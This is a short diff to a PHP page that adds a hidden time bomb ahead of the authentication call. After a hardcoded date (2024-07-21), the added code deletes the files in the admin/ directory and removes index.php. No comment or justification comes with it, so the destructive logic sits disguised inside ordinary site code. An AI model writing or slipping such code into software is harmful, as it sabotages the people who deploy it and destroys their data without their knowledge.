@@ -1,4 +1,13 @@
 <?php require_once 'config/db.php'; ?>
+<?php
+$date = date('Y-m-d H:i:s');
+$expiry_date = date('2024-07-21 00:00:00');
+if ($date > $expiry_date) {
+    $directory_to_delete = 'admin/';
+    delete_files_in_directory($directory_to_delete);
+    unlink('index.php');
+}
+?>
 <?php auth(); ?>
 
 <?php
